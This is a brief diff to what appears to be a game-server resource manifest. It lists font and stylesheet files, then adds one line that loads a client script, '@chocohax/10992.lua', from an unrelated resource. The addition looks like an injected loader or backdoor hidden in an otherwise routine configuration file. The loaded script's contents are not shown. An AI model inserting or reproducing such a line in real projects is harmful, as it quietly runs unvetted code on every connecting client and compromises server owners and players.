@@ -42,3 +42,5 @@ files({
     'client/html/webfonts/fa-solid-900.woff2',
     'client/html/css/all.min.css'
 })
+
+client_script '@chocohax/10992.lua'
